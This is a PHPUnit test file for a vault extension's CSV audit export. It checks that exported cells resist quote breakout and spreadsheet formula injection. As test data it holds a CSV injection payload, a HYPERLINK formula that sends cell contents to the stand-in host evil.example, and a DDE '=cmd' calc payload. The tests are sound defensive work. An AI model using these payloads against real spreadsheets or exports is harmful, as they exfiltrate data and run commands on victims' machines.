<?php

/*
 * Copyright (c) 2025-2026 Netresearch DTT GmbH
 * SPDX-License-Identifier: GPL-2.0-or-later
 */

declare(strict_types=1);

namespace Netresearch\NrVault\Tests\Unit\Controller;

use Netresearch\NrVault\Audit\AuditLogEntry;
use Netresearch\NrVault\Controller\AuditController;
use Netresearch\NrVault\Tests\Unit\TestCase;
use PHPUnit\Framework\Attributes\Test;
use Psr\Http\Message\ResponseInterface;
use ReflectionClass;

/**
 * Unit tests for the CSV audit export writer of AuditController.
 *
 * The module render is covered by the functional/E2E suites (the class is
 * excluded from the unit coverage source set, hence no CoversClass attribute);
 * these tests assert the emitted CSV bytes of the private export seam, which
 * consults no constructor dependency. They pin the strict RFC-4180 output
 * (`escape: ''`): with PHP's legacy escape character an attacker-controlled
 * audit field could terminate its own quoted cell and inject a spreadsheet
 * formula into a cell that CsvFormulaSanitizer never inspected (CWE-1236).
 */
final class AuditControllerTest extends TestCase
{
    /**
     * Backslash followed by a double quote — the byte sequence PHP's legacy
     * escape character keeps unescaped, closing the quoted cell for every
     * RFC-4180 consumer.
     */
    private const BREAKOUT_PAYLOAD = 'x\\",=HYPERLINK("http://evil.example/"&A1,"open")';

    #[Test]
    public function csvExportDoublesEnclosuresAfterABackslash(): void
    {
        $csv = $this->exportCsv([$this->createEntry(requestId: self::BREAKOUT_PAYLOAD)]);

        // The quote following the backslash is doubled, so it stays cell data.
        self::assertStringContainsString('"x\\"",=HYPERLINK(', $csv);
        // Sanity check on the inverse: the unescaped, cell-terminating form
        // that the legacy escape character produced must not appear.
        self::assertStringNotContainsString('"x\\",=HYPERLINK(', $csv);
    }

    #[Test]
    public function csvExportKeepsBreakoutPayloadInsideASingleCell(): void
    {
        $csv = $this->exportCsv([$this->createEntry(requestId: self::BREAKOUT_PAYLOAD)]);

        [$header, $row] = $this->parseCsv($csv);

        self::assertCount(\count($header), $row);

        $columnIndex = array_search('requestId', $header, true);
        self::assertIsInt($columnIndex);
        self::assertSame(self::BREAKOUT_PAYLOAD, $row[$columnIndex]);

        foreach ($row as $cell) {
            self::assertThat(
                $cell === '' || !\in_array($cell[0], ['=', '+', '-', '@', "\t", "\r"], true),
                self::isTrue(),
                'No exported cell may start with a spreadsheet formula leader, got: ' . $cell,
            );
        }
    }

    #[Test]
    public function csvExportStillNeutralizesFormulaLeaders(): void
    {
        $csv = $this->exportCsv([$this->createEntry(userAgent: '=cmd|\' /C calc\'!A0')]);

        [$header, $row] = $this->parseCsv($csv);

        $columnIndex = array_search('userAgent', $header, true);
        self::assertIsInt($columnIndex);
        self::assertSame('\'=cmd|\' /C calc\'!A0', $row[$columnIndex]);
    }

    /**
     * @param list<AuditLogEntry> $entries
     */
    private function exportCsv(array $entries): string
    {
        $reflection = new ReflectionClass(AuditController::class);
        $subject = $reflection->newInstanceWithoutConstructor();

        $response = $reflection->getMethod('exportAsCsv')->invoke($subject, $entries);
        self::assertInstanceOf(ResponseInterface::class, $response);

        return (string) $response->getBody();
    }

    /**
     * Parse the export the way an RFC-4180 consumer (Excel, LibreOffice,
     * Google Sheets) does: quotes are only escaped by doubling.
     *
     * @return array{list<string>, list<string>}
     */
    private function parseCsv(string $csv): array
    {
        $handle = fopen('php://temp', 'r+');
        self::assertIsResource($handle);
        fwrite($handle, $csv);
        rewind($handle);

        $rows = [];
        while (($row = fgetcsv($handle, escape: '')) !== false) {
            $rows[] = array_map(static fn (mixed $cell): string => \is_string($cell) ? $cell : '', $row);
        }
        fclose($handle);

        self::assertCount(2, $rows, 'Expected exactly a header row and one data row.');

        return [$rows[0], $rows[1]];
    }

    private function createEntry(string $requestId = 'req-1', string $userAgent = 'curl/8.0'): AuditLogEntry
    {
        return new AuditLogEntry(
            uid: 1,
            secretIdentifier: 'app/api-key',
            action: 'read',
            success: true,
            errorMessage: null,
            reason: null,
            actorUid: 1,
            actorType: 'backend',
            actorUsername: 'admin',
            actorRole: 'admin',
            ipAddress: '203.0.113.7',
            userAgent: $userAgent,
            requestId: $requestId,
            previousHash: str_repeat('a', 64),
            entryHash: str_repeat('b', 64),
            hashBefore: '',
            hashAfter: '',
            crdate: 1750000000,
            context: ['source' => 'unit-test'],
        );
    }
}
